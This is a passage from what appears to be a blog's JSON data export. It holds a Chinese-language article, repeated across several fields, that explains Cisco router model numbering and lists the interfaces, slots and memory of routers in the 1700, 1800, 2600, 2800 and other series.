1个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、128M内存</p><p>CISCO2611XM&#160;&#160;&#160;&#160;&#160;&#160;&#160;  2个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、128M内存</p><p>CISCO2620XM&#160;&#160;&#160;&#160;&#160;&#160;&#160;  1个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、128M内存</p><p>CISCO2621XM&#160;&#160;&#160;&#160;&#160;&#160;&#160;  2个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、128M内存</p>CISCO2650XM&#160;&#160;&#160;&#160;1个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、256M内存<p>CISCO2651XM&#160;&#160;&#160; 2个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、256M内存</p><p>CISCO2691&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;  2个10/100M以太网络接口、1个NM模块插槽、3个WIC插槽、1个AIM插槽、32M闪存、256M内存</p><p>Cisco Systems通过Cisco 2600系列将企业级的通用性、集成和功能扩展到了建立 以机构。随着新服务和运用  的面市，Cisco 2600系列的模块化体系结构能够提供适应网络技能 变化所需的通用性。Cisco  2600系列配置了强大的RISC处理器，能够支持当今不断发展的网络中所需的高级服务质量（QoS）、安全和网络集成特征 。通过将多个独立设备的功能集成到一个单元之中，Cisco 2600系列降低了管理远程网络的复杂性。Cisco 2600系列与Cisco  1600、1700和3600系列共享模块化接口，为Internet、内部网访问、多服务语音/数据集成、模拟和数字拨号访问服务、VPN访问、ATM 访问集中、VLAN以及路由带宽管理等运用  提供经济有效的处理 方案。</p><p>四&#160;&#160; .CISCO2800系列路由器</p><p>CISCO2801&#160;&#160;&#160;&#160;&#160;&#160; 2801 Router/AC PWR,2FE,4slots(2HWICs),2AIMS,IP  BASE,64F/128D</p><p>CISCO2811&#160;&#160;&#160;&#160;&#160;&#160; 2811 w/ AC PWR,2FE,4HWICs,2PVDMs,1NME,2AIMS,IP  BASE,64F/256D</p><p>CISCO2821&#160;&#160;&#160;&#160;&#160;&#160; 2821 w/ AC PWR,2GE,4HWICs,3PVDM,1NME-X,2AIM,IP  BASE,64F/256D</p><p>CISCO2851&#160;&#160;&#160;&#160;&#160;&#160;&#160; 2851 w/ AC PWR,2GE,4HWIC,3PVDM,1NME-XD,2AIM,IP  BASE,64F/256D</p><p>Cisco 2800系列包括四个平台：Cisco 2801、Cisco 2811、Cisco 2821和 Cisco  2851。与价格类似的前几代思科路由器相比，Cisco  2800系列可以将性能提升五倍，将安全和话音性能提升十倍，并且可以提供新的嵌入式服务选项，因而可以为客户提供主要 的附加值。它可以在大幅度提升插槽性能和密度的同时，支持Cisco 1700和2600系列中现有的90多种模块。</p><p>五 .CISCO3600系列路由器</p><p>Cisco 3600系列是一个适合大中型企业Internet服务供应商的模块化、多功能访问平台家族。Cisco  3600系列拥有70多个模块化接口]\n]>","slug":"思科Cisco-路由器型号剖析","published":1,"updated":"2023-04-22T05:38:45.061Z","_id":"clgrjlxm900c27opid3axaah5","comments":1,"layout":"post","photos":[],"link":"","content":"<![CDATA[如：Cisco1721，Cisco2621，Cisco3662，Cisco3745。这些都是路由器。 比如：Cisco2621  其中Cisco：是品牌，后面的前两位数字是系列号，这款产品属于2600系列，后两位是具体的型号。<p>其中Cisco路由器有以下多个 系列：<br />Cisco2500系列：Cisco2501、Cisco2502、一直到Cisco2514，这些都是国内能见到的设备，再往上就是国外 的了，国内很少见到。<br />Cisco1700：1720、1721、1751、1760<br />Cisco1800：1821、1841<br />Cisco2600 系列：2610、2611、2620、2621、2651<br />Cisco2600XM系列：2610XM、2611XM、2620XM、2621XM<br />Cisco3600：3620、 3640、3660<br />Cisco3700：3725、3745<br />Cisco3800：3825、3845<br />Cisco7200：7204、 7206、7204VXR、7206VXR这些都是机箱，运用 当中须要 引擎的支持（NPE-225、NPE-300、NPE-400、NPE-G1、最新的是NPE-G2）和业务模块的支持。<br />Cisco7500：7507、 7513 同样也须要 引擎的支持（RSP2、RSP4、RSP8、RSP16）和业务模块的支持，7200上的业务模块都能在75上运用 ，须要 一块VIP卡的支持。</p><p>往上就是12000系列：12008，12016这些是目前最高端的。同样也须要 引擎和业务模块的支持。</p><p>思科路由器主要型号介绍：<br /><br />700系列&#160;&#160;&#160;&#160;&#160;&#160; ISDN路由器<br />-76x型:  1E(10baseT)+1*BRI(NT1)<br />-77x型: 4E(10baseT)+2个模拟电话端口(NT1)<br />-支持30个用户<br />---------------------------------------------------------------------<br />800 系列&#160;&#160;&#160;&#160;&#160;&#160;&#160; 采用CiscoIOS技能 的ISDN,IDSL和串行路由器<br />-1*BRI(可选的NT1)、IDSL或1端口串行<br />-可选的4端口以太网集线器和2个模拟电话端口(NT1型号)<br />-增强的安全特征 <br />----------------------------------------------------------------------<br />1000 系列&#160;&#160;&#160; 固定配置桌面访问路由器<br />-1E<br />-1*BRI(可选的NT1）或1端口同步或异步串行<br />----------------------------------------------------------------------<br /><u>1400</u>系 列&#160;&#160;&#160; ADSL路由器<br />-1E(10baseT)和1ATM-25(1401),或1E和1ADSL(DMT-2)(1417)<br />-旨在提供高达8Mbps的DSL访问<br />-Cisco端到端DSL处理 方案的一部份<br />----------------------------------------------------------------------<br />1600 系列&#160;&#160;&#160; 模块化桌面访问路由器<br />-1E or 2E(10baseT)<br />-1*BRI(可选的NT1)或1端口同步或异步串行<br />-1WIC槽<br />----------------------------------------------------------------------<br />1700 系列&#160;&#160;&#160; 灵活、安全的模块化访问路由器<br />-1FE<br />-模块化插槽支持广泛的广域网和模拟语音接口卡<br />-支持安全的Internet、Lan、Wan访问以及新广域网运用  ，包括<br />VPN、集成化语音/Voip和宽带<br />----------------------------------------------------------------------<br />2500 系列&#160;&#160;&#160; 固定配置及模块化配置访问路由器和服务器<br />-单或双Lan，EtherNet or TokengRing<br />-路由器/集线器或访问服务器<br />-单、双串行或高密度串行模型<br />----------------------------------------------------------------------<br />2600 系列&#160;&#160;&#160; 模块化访问路由器、语音数据网关和拨号访问服务器<br />-单或双Lan，EtherNet or  TokenRing<br />-与1600,1700和3600系列共享Wan Interface和网络模块。<br />-广泛的介质支持，包括异步和同步串行、ISDN、部分和多路T1/E1&#160;以太网、模拟调制解调器和ATM<br />----------------------------------------------------------------------<br />3300 系列&#160;&#160;&#160; 承载级SONET访问设备<br />-完全冗余的平台<br />-结合SONET可靠性和第三层意识<br />-以太网接口支持可以为桥接或路由配置的不同服务接口，并通过面<br />向集线器、交换机或路由器的10BaseT连接本地局域网<br />----------------------------------------------------------------------<br />3600 系列&#160;&#160;&#160; 模块化的高密度访问路由器<br />-2、4和6插槽型路由器<br />-广泛的介质支持，包括异步和同步串行、ISDN、多路T1/E1、以太<br />网、高速 以太网、令牌环网、数字调制解调器和ATM<br />-通过IP或帧中继提供语音/传真<br />----------------------------------------------------------------------<br />MC3810&#160;&#160;&#160;&#160;&#160;&#160;  小型低成本的多服务访问集中器<br />-1E和2端口串行<br />-6端口模拟或24/30端口数字语音<br />-数据、语音和视频集成<br />----------------------------------------------------------------------<br />4000 系列&#160;&#160;&#160;&#160;&#160;&#160;&#160; 模块化的高密度路由器<br />-适用于所有型号的3个插槽<br />-可以选择100-MHz或133-MHz处理器<br />-广泛的介质支持，包括异步和同步串行、ISDN、多路T1/E1、以太网、高速 以太网、令牌环网、FDDI、HSSI和ATM&#160;<br />----------------------------------------------------------------------<br />6400 系列&#160;&#160;&#160; 用于在POP或总部端接大量用户和多域服务的承载级集合设备<br />-每个平台多达14,000个用户端接<br />-L2TP、LAC/LNS、多域服务<br />-全ATM功能<br />----------------------------------------------------------------------<br />6700 系列&#160;&#160;&#160; 提供电路交换和基于包的语音/数据流量的集成化访问平台<br />-提供端到端集成化语音和数据服务的模块化,可伸缩的高密度平台<br />-5个用于RT和CPE运用  的线路卡插槽（6705）<br />-32个用于CO和RT运用  的线路卡插槽（6732）<br />----------------------------------------------------------------------<br />7100 系列&#160;&#160;&#160; 大型分支机构和中央站点VPN路由器<br />-彻底 的VPN服务套件，包括加密、隧道、防火墙及带宽管理<br />-方便部署的嵌入式I/O<br />-用于IPSec和PPTP加密协同处理的服务模块插槽<br />----------------------------------------------------------------------<br />7200 系列&#160;&#160;&#160; 提供智能服务、模块性、高性能和可伸缩性的广域网边缘路由器<br />-完全模块化、机箱式<br />-4或6插槽模型，可以选择三种系统处理器<br />-广泛的局域网和广域网选项，包括以太网，高速 以太网，100VG-<br />AnyLan、令牌环网、FDDI、串行、ISDN、HSSI、ATM、Packet&#160;over  DS3/E3<br />----------------------------------------------------------------------<br />7500 系列&#160;&#160;&#160; 主要的高端服务启动的核心及广域网集合路由器，适合企业及服务<br />供应商运用  中的语音、视频和数据<br />-5、7和13插槽模型<br />-1、2或4个总线模型，提供1、2或4Gbps背板<br />-广泛的局域网和广域网选项，包括以太网，高速 以太网，千兆<br />以太网、令牌环网、FDDI、串行、ISDN、HSSI、ATM、Packet&#160;over DS3/E3<br />----------------------------------------------------------------------<br />12000 系列&#160;&#160;&#160;&#160; 可伸缩的千兆们交换路由器(GSR)<br />-8、12或16插槽模型<br />-根据型号不同，提供40、60或80Gbps交换光纤<br />-为IP执行  了优化<br />-承载级</p>下面是多个 具体的系列的一些参数。<p>一.CISCO1700系列路由器</p><p>型号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 描述</p><p>CISCO1721&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1个10/100M以太网络接口&#160;&#160; 、2个WIC插槽, 32M闪存/64M 内存</p><p>CISCO1760&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1个10/100M以太网络接口&#160;&#160; 、4个WIC插槽&#160;&#160; 、19寸机箱、32M闪存/64M  内存</p><p>CISCO1760-V&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1个10/100M以太网络\n接口&#160;&#160; 、4个WIC/VIC插槽、19寸机箱、32M闪存/96M  内存</p><p>CISCO1721-VPN/K9&#160;&#160;&#160;&#160;&#160;&#160; 1721 VPN Boundl 、VPN加快 卡、96MB内存、32MB闪存,VPN防火墙IOS软件</p><p>Cisco 1700系列模块化访问路由器为中小型企业和小型分支机构提供灵活、安全的访问处理 方案。Cisco 1700系列的模块化体系结构能运用 户定制一个满足其目前访问要求的安全访问处理 方案，能使他们经济有效地实施新运用  ，包括虚拟专网（VPN）访问、多服务语音/数据集成和宽带服务。集成的网络功能包括1个可选的防火墙、CSU/DSU和VPN特征 ，减少了部署及管理时间和努力。</p><p>Cisco 1721支持传统的数据访问运用  以及目前和未来的新广域网服务，包括VPN和宽带技能 。</p><p>除数据运用  之外，Cisco 1751还支持集成的多服务语音/传真/数据运用  。企业可以从一个稳健的数据访问处理 方案开始，然后在准备就绪时经济有效地集成语音和传真。<br />Cisco  1760模块化接入路由器为中小企业和小型企业个体分支机构提供多服务电子商务功能。思科系统公司隆重推出了Cisco  1760模块化接入路由器，这种路由器是中小企业和小型企业个体分支机构的理想接入处理 方案。Cisco  1760属于四插槽模块化接入路由器，安装在19寸机架中不但能提供安全的互联网和内部网接入，还能在同一个平台上实施多种电子商务和语音运用  。这些服务包括IP语音（VoIP）安全的虚拟专用网（VPN）接入和集成式防火墙，以及企业级数字用户线路（DSL）接入，该产品适用于许多行业和企 业。 借助Cisco1760，客户能够执行  安全的数据联网开始，并在须要 时移植到VoIP和IP电话服务。有了这种灵活性，除基本的互联网和内部网接入外，您还能销售增值服务，从而成为客户的战备联网合作伙伴.由于能引入新运 用  ，并在平台上修改或添加WAN和语音接口，因而能根据客户的需求添加服务并获得更多收入。Cisco1760运用 的Cisco IOS软件、WAN和语音接口卡与Cisco  1700、Cisco2600和Cisco3600路由器相同，不但降低了存储和支持要求，还能充分运用  您在销售和支持思科系统公司接入处理 方案方面积累的丰富体会 。二 .CISCO1800系列路由器</p><p>CISCO1841&#160;&#160;&#160; Modular Router w/2xFE, 2 WAN slots, 32 FL/128 DR</p><p>Cisco 1800系列集成多业务路由器以思科20年的领先地位和创新理念为基础，能够智能地将数据、安全性和无线技能 嵌入到同一个永续系统中，以便高速 、安全地将关键业务运用  提供给中小企业和小型分支机构。</p><p>Cisco 1800系列集成多业务路由器是屡获大奖的Cisco 1700系列路由器的下一代产品。Cisco  1801、1802、1803、1811和1812路由器运用 固定配置，Cisco 1841则运用 模块化配置。</p><p>因为有Cisco IOS软件，Cisco 1800系列路由器能够借助多种先进的安全服务和管理功能支持思科自防御网络，这其中包括硬件加密加快 、IPSec VPN（AES、3DES、DES）、防火墙保卫 、内部入侵防御（IPS）、网络准入控制（NAC）和URL过滤支持等。为简化管理和配置，Cisco  1800预装有基于Web的直观思科路由器和安全设备管理器（SDM）。</p><p>Cisco 1841集成多业务路由器：以线速提供安全的并发服务</p><p>Cisco 1841集成多业务路由器能够以线速提供安全的数据访问运用  ，从而为中小企业和小型分支机构提供全套功能和灵活性，以便实现安全的互联网和内部网接入。</p><p>与Cisco 7120和1721相比，Cisco 1841路由器不仅性能提高了五倍以上，还可通过新型结构 提供安全的并发服务，因而价值更高。运用  AIM、新型高速WAN接口卡（HWIC）和VWIC模块化特征 ，用户可以运用 多种连接形式 。另外，由于支持30多种现有的1700系列WAN接口卡（仅限WIC/VIC/VWIC数据模式），因而能够实现投资保卫 。</p><p>Cisco 1800系列固定配置型号：运用  冗余WAN链路为宽带接入提供安全的并发服务，Cisco  1800系列固定配置型号能够提供安全的宽带、城域以太网和无线连接。企业能够降低成本，因为只需部署一台设备就能提供多种功能，例如运用  集成冗余链路提供的DSL宽带接入、路由、LAN交换机、防火墙、VPN、IPS、无线局域网技能 以及一般由独立设备执行的服务质量（QoS）等。Cisco  1801、1802、1803集成多业务路由器不但能提供ADSL或G.SHDSL高速宽带接入，还能通过集成ISDN S/T  BRI备份保证网络的可靠性。Cisco 1811和1812通过两个10/100BaseT  WAN端口提供高速宽带和以太网接入，并通过V.92模拟调制解调器（Cisco 1811）或ISDN S/T BRI接口（Cisco  1812）提供集成WAN备份。</p><p>三 .CISCO2600系列路由器</p><p>CISCO2610XM&#160;&#160;&#160;&#160;&#160;&#160;&#160;  1个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、128M内存</p><p>CISCO2611XM&#160;&#160;&#160;&#160;&#160;&#160;&#160;  2个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、128M内存</p><p>CISCO2620XM&#160;&#160;&#160;&#160;&#160;&#160;&#160;  1个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、128M内存</p><p>CISCO2621XM&#160;&#160;&#160;&#160;&#160;&#160;&#160;  2个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、128M内存</p>CISCO2650XM&#160;&#160;&#160;&#160;1个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、256M内存<p>CISCO2651XM&#160;&#160;&#160; 2个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、256M内存</p><p>CISCO2691&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;  2个10/100M以太网络接口、1个NM模块插槽、3个WIC插槽、1个AIM插槽、32M闪存、256M内存</p><p>Cisco Systems通过Cisco 2600系列将企业级的通用性、集成和功能扩展到了建立 以机构。随着新服务和运用  的面市，Cisco 2600系列的模块化体系结构能够提供适应网络技能 变化所需的通用性。Cisco  2600系列配置了强大的RISC处理器，能够支持当今不断发展的网络中所需的高级服务质量（QoS）、安全和网络集成特征 。通过将多个独立设备的功能集成到一个单元之中，Cisco 2600系列降低了管理远程网络的复杂性。Cisco 2600系列与Cisco  1600、1700和3600系列共享模块化接口，为Internet、内部网访问、多服务语音/数据集成、模拟和数字拨号访问服务、VPN访问、ATM 访问集中、VLAN以及路由带宽管理等运用  提供经济有效的处理 方案。</p><p>四&#160;&#160; .CISCO2800系列路由器</p><p>CISCO2801&#160;&#160;&#160;&#160;&#160;&#160; 2801 Router/AC PWR,2FE,4slots(2HWICs),2AIMS,IP  BASE,64F/128D</p><p>CISCO2811&#160;&#160;&#160;&#160;&#160;&#160; 2811 w/ AC PWR,2FE,4HWICs,2PVDMs,1NME,2AIMS,IP  BASE,64F/256D</p><p>CISCO2821&#160;&#160;&#160;&#160;&#160;&#160; 2821 w/ AC PWR,2GE,4HWICs,3PVDM,1NME-X,2AIM,IP  BASE,64F/256D</p><p>CISCO2851&#160;&#160;&#160;&#160;&#160;&#160;&#160; 2851 w/ AC PWR,2GE,4HWIC,3PVDM,1NME-XD,2AIM,IP  BASE,64F/256D</p><p>Cisco 2800系列包括四个平台：Cisco 2801、Cisco 2811、Cisco 2821和 Cisco  2851。与价格类似的前几代思科路由器相比，Cisco  2800系列可以将性能提升五倍，将安全和话音性能提升十倍，并且可以提供新的嵌入式服务选项，因而可以为客户提供主要 的附加值。它可以在大幅度提升插槽性能和密度的同时，支持Cisco 1700和2600系列中现有的90多种模块。</p><p>五 .CISCO3600系列路由器</p><p>Cisco 3600系列是一个适合大中型企业Internet服务供应商的模块化、多功能访问平台家族。Cisco  3600系列拥有70多个模块化接口]\n]>","site":{"data":{}},"excerpt":"","more":"<![CDATA[如：Cisco1721，Cisco2621，Cisco3662，Cisco3745。这些都是路由器。 比如：Cisco2621  其中Cisco：是品牌，后面的前两位数字是系列号，这款产品属于2600系列，后两位是具体的型号。<p>其中Cisco路由器有以下多个 系列：<br />Cisco2500系列：Cisco2501、Cisco2502、一直到Cisco2514，这些都是国内能见到的设备，再往上就是国外 的了，国内很少见到。<br />Cisco1700：1720、1721、1751、1760<br />Cisco1800：1821、1841<br />Cisco2600 系列：2610、2611、2620、2621、2651<br />Cisco2600XM系列：2610XM、2611XM、2620XM、2621XM<br />Cisco3600：3620、 3640、3660<br />Cisco3700：3725、3745<br />Cisco3800：3825、3845<br />Cisco7200：7204、 7206、7204VXR、7206VXR这些都是机箱，运用 当中须要 引擎的支持（NPE-225、NPE-300、NPE-400、NPE-G1、最新的是NPE-G2）和业务模块的支持。<br />Cisco7500：7507、 7513 同样也须要 引擎的支持（RSP2、RSP4、RSP8、RSP16）和业务模块的支持，7200上的业务模块都能在75上运用 ，须要 一块VIP卡的支持。</p><p>往上就是12000系列：12008，12016这些是目前最高端的。同样也须要 引擎和业务模块的支持。</p><p>思科路由器主要型号介绍：<br /><br />700系列&#160;&#160;&#160;&#160;&#160;&#160; ISDN路由器<br />-76x型:  1E(10baseT)+1*BRI(NT1)<br />-77x型: 4E(10baseT)+2个模拟电话端口(NT1)<br />-支持30个用户<br />---------------------------------------------------------------------<br />800 系列&#160;&#160;&#160;&#160;&#160;&#160;&#160; 采用CiscoIOS技能 的ISDN,IDSL和串行路由器<br />-1*BRI(可选的NT1)、IDSL或1端口串行<br />-可选的4端口以太网集线器和2个模拟电话端口(NT1型号)<br />-增强的安全特征 <br />----------------------------------------------------------------------<br />1000 系列&#160;&#160;&#160; 固定配置桌面访问路由器<br />-1E<br />-1*BRI(可选的NT1）或1端口同步或异步串行<br />----------------------------------------------------------------------<br /><u>1400</u>系 列&#160;&#160;&#160; ADSL路由器<br />-1E(10baseT)和1ATM-25(1401),或1E和1ADSL(DMT-2)(1417)<br />-旨在提供高达8Mbps的DSL访问<br />-Cisco端到端DSL处理 方案的一部份<br />----------------------------------------------------------------------<br />1600 系列&#160;&#160;&#160; 模块化桌面访问路由器<br />-1E or 2E(10baseT)<br />-1*BRI(可选的NT1)或1端口同步或异步串行<br />-1WIC槽<br />----------------------------------------------------------------------<br />1700 系列&#160;&#160;&#160; 灵活、安全的模块化访问路由器<br />-1FE<br />-模块化插槽支持广泛的广域网和模拟语音接口卡<br />-支持安全的Internet、Lan、Wan访问以及新广域网运用  ，包括<br />VPN、集成化语音/Voip和宽带<br />----------------------------------------------------------------------<br />2500 系列&#160;&#160;&#160; 固定配置及模块化配置访问路由器和服务器<br />-单或双Lan，EtherNet or TokengRing<br />-路由器/集线器或访问服务器<br />-单、双串行或高密度串行模型<br />----------------------------------------------------------------------<br />2600 系列&#160;&#160;&#160; 模块化访问路由器、语音数据网关和拨号访问服务器<br />-单或双Lan，EtherNet or  TokenRing<br />-与1600,1700和3600系列共享Wan Interface和网络模块。<br />-广泛的介质支持，包括异步和同步串行、ISDN、部分和多路T1/E1&#160;以太网、模拟调制解调器和ATM<br />----------------------------------------------------------------------<br />3300 系列&#160;&#160;&#160; 承载级SONET访问设备<br />-完全冗余的平台<br />-结合SONET可靠性和第三层意识<br />-以太网接口支持可以为桥接或路由配置的不同服务接口，并通过面<br />向集线器、交换机或路由器的10BaseT连接本地局域网<br />----------------------------------------------------------------------<br />3600 系列&#160;&#160;&#160; 模块化的高密度访问路由器<br />-2、4和6插槽型路由器<br />-广泛的介质支持，包括异步和同步串行、ISDN、多路T1/E1、以太<br />网、高速 以太网、令牌环网、数字调制解调器和ATM<br />-通过IP或帧中继提供语音/传真<br />----------------------------------------------------------------------<br />MC3810&#160;&#160;&#160;&#160;&#160;&#160;  小型低成本的多服务访问集中器<br />-1E和2端口串行<br />-6端口模拟或24/30端口数字语音<br />-数据、语音和视频集成<br />----------------------------------------------------------------------<br />4000 系列&#160;&#160;&#160;&#160;&#160;&#160;&#160; 模块化的高密度路由器<br />-适用于所有型号的3个插槽<br />-可以选择100-MHz或133-MHz处理器<br />-广泛的介质支持，包括异步和同步串行、ISDN、多路T1/E1、以太网、高速 以太网、令牌环网、FDDI、HSSI和ATM&#160;<br />----------------------------------------------------------------------<br />6400 系列&#160;&#160;&#160; 用于在POP或总部端接大量用户和多域服务的承载级集合设备<br />-每个平台多达14,000个用户端接<br />-L2TP、LAC/LNS、多域服务<br />-全ATM功能<br />----------------------------------------------------------------------<br />6700 系列&#160;&#160;&#160; 提供电路交换和基于包的语音/数据流量的集成化访问平台<br />-提供端到端集成化语音和数据服务的模块化,可伸缩的高密度平台<br />-5个用于RT和CPE运用  的线路卡插槽（6705）<br />-32个用于CO和RT运用  的线路卡插槽（6732）<br />----------------------------------------------------------------------<br />7100 系列&#160;&#160;&#160; 大型分支机构和中央站点VPN路由器<br />-彻底 的VPN服务套件，包括加密、隧道、防火墙及带宽管理<br />-方便部署的嵌入式I/O<br />-用于IPSec和PPTP加密协同处理的服务模块插槽<br />----------------------------------------------------------------------<br />7200 系列&#160;&#160;&#160; 提供智能服务、模块性、高性能和可伸缩性的广域网边缘路由器<br />-完全模块化、机箱式<br />-4或6插槽模型，可以选择三种系统处理器<br />-广泛的局域网和广域网选项，包括以太网，高速 以太网，100VG-<br />AnyLan、令牌环网、FDDI、串行、ISDN、HSSI、ATM、Packet&#160;over  DS3/E3<br />----------------------------------------------------------------------<br />7500 系列&#160;&#160;&#160; 主要的高端服务启动的核心及广域网集合路由器，适合企业及服务<br />供应商运用  中的语音、视频和数据<br />-5、7和13插槽模型<br />-1、2或4个总线模型，提供1、2或4Gbps背板<br />-广泛的局域网和广域网选项，包括以太网，高速 以太网，千兆<br />以太网、令牌环网、FDDI、串行、ISDN、HSSI、ATM、Packet&#160;over DS3/E3<br />----------------------------------------------------------------------<br />12000 系列&#160;&#160;&#160;&#160; 可伸缩的千兆们交换路由器(GSR)<br />-8、12或16插槽模型<br />-根据型号不同，提供40、60或80Gbps交换光纤<br />-为IP执行  了优化<br />-承载级</p>下面是多个 具体的系列的一些参数。<p>一.CISCO1700系列路由器</p><p>型号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 描述</p><p>CISCO1721&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1个10/100M以太网络接口&#160;&#160; 、2个WIC插槽, 32M闪存/64M 内存</p><p>CISCO1760&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1个10/100M以太网络接口&#160;&#160; 、4个WIC插槽&#160;&#160; 、19寸机箱、32M闪存/64M  内存</p><p>CISCO1760-V&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1个10/100M以太网络\n接口&#160;&#160; 、4个WIC/VIC插槽、19寸机箱、32M闪存/96M  内存</p><p>CISCO1721-VPN/K9&#160;&#160;&#160;&#160;&#160;&#160; 1721 VPN Boundl 、VPN加快 卡、96MB内存、32MB闪存,VPN防火墙IOS软件</p><p>Cisco 1700系列模块化访问路由器为中小型企业和小型分支机构提供灵活、安全的访问处理 方案。Cisco 1700系列的模块化体系结构能运用 户定制一个满足其目前访问要求的安全访问处理 方案，能使他们经济有效地实施新运用  ，包括虚拟专网（VPN）访问、多服务语音/数据集成和宽带服务。集成的网络功能包括1个可选的防火墙、CSU/DSU和VPN特征 ，减少了部署及管理时间和努力。</p><p>Cisco 1721支持传统的数据访问运用  以及目前和未来的新广域网服务，包括VPN和宽带技能 。</p><p>除数据运用  之外，Cisco 1751还支持集成的多服务语音/传真/数据运用  。企业可以从一个稳健的数据访问处理 方案开始，然后在准备就绪时经济有效地集成语音和传真。<br />Cisco  1760模块化接入路由器为中小企业和小型企业个体分支机构提供多服务电子商务功能。思科系统公司隆重推出了Cisco  1760模块化接入路由器，这种路由器是中小企业和小型企业个体分支机构的理想接入处理 方案。Cisco  1760属于四插槽模块化接入路由器，安装在19寸机架中不但能提供安全的互联网和内部网接入，还能在同一个平台上实施多种电子商务和语音运用  。这些服务包括IP语音（VoIP）安全的虚拟专用网（VPN）接入和集成式防火墙，以及企业级数字用户线路（DSL）接入，该产品适用于许多行业和企 业。 借助Cisco1760，客户能够执行  安全的数据联网开始，并在须要 时移植到VoIP和IP电话服务。有了这种灵活性，除基本的互联网和内部网接入外，您还能销售增值服务，从而成为客户的战备联网合作伙伴.由于能引入新运 用  ，并在平台上修改或添加WAN和语音接口，因而能根据客户的需求添加服务并获得更多收入。Cisco1760运用 的Cisco IOS软件、WAN和语音接口卡与Cisco  1700、Cisco2600和Cisco3600路由器相同，不但降低了存储和支持要求，还能充分运用  您在销售和支持思科系统公司接入处理 方案方面积累的丰富体会 。二 .CISCO1800系列路由器</p><p>CISCO1841&#160;&#160;&#160; Modular Router w/2xFE, 2 WAN slots, 32 FL/128 DR</p><p>Cisco 1800系列集成多业务路由器以思科20年的领先地位和创新理念为基础，能够智能地将数据、安全性和无线技能 嵌入到同一个永续系统中，以便高速 、安全地将关键业务运用  提供给中小企业和小型分支机构。</p><p>Cisco 1800系列集成多业务路由器是屡获大奖的Cisco 1700系列路由器的下一代产品。Cisco  1801、1802、1803、1811和1812路由器运用 固定配置，Cisco 1841则运用 模块化配置。</p><p>因为有Cisco IOS软件，Cisco 1800系列路由器能够借助多种先进的安全服务和管理功能支持思科自防御网络，这其中包括硬件加密加快 、IPSec VPN（AES、3DES、DES）、防火墙保卫 、内部入侵防御（IPS）、网络准入控制（NAC）和URL过滤支持等。为简化管理和配置，Cisco  1800预装有基于Web的直观思科路由器和安全设备管理器（SDM）。</p><p>Cisco 1841集成多业务路由器：以线速提供安全的并发服务</p><p>Cisco 1841集成多业务路由器能够以线速提供安全的数据访问运用  ，从而为中小企业和小型分支机构提供全套功能和灵活性，以便实现安全的互联网和内部网接入。</p><p>与Cisco 7120和1721相比，Cisco 1841路由器不仅性能提高了五倍以上，还可通过新型结构 提供安全的并发服务，因而价值更高。运用  AIM、新型高速WAN接口卡（HWIC）和VWIC模块化特征 ，用户可以运用 多种连接形式 。另外，由于支持30多种现有的1700系列WAN接口卡（仅限WIC/VIC/VWIC数据模式），因而能够实现投资保卫 。</p><p>Cisco 1800系列固定配置型号：运用  冗余WAN链路为宽带接入提供安全的并发服务，Cisco  1800系列固定配置型号能够提供安全的宽带、城域以太网和无线连接。企业能够降低成本，因为只需部署一台设备就能提供多种功能，例如运用  集成冗余链路提供的DSL宽带接入、路由、LAN交换机、防火墙、VPN、IPS、无线局域网技能 以及一般由独立设备执行的服务质量（QoS）等。Cisco  1801、1802、1803集成多业务路由器不但能提供ADSL或G.SHDSL高速宽带接入，还能通过集成ISDN S/T  BRI备份保证网络的可靠性。Cisco 1811和1812通过两个10/100BaseT  WAN端口提供高速宽带和以太网接入，并通过V.92模拟调制解调器（Cisco 1811）或ISDN S/T BRI接口（Cisco  1812）提供集成WAN备份。</p><p>三 .CISCO2600系列路由器</p><p>CISCO2610XM&#160;&#160;&#160;&#160;&#160;&#160;&#160;  1个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、128M内存</p><p>CISCO2611XM&#160;&#160;&#160;&#160;&#160;&#160;&#160;  2个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、128M内存</p><p>CISCO2620XM&#160;&#160;&#160;&#160;&#160;&#160;&#160;  1个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、128M内存</p><p>CISCO2621XM&#160;&#160;&#160;&#160;&#160;&#160;&#160;  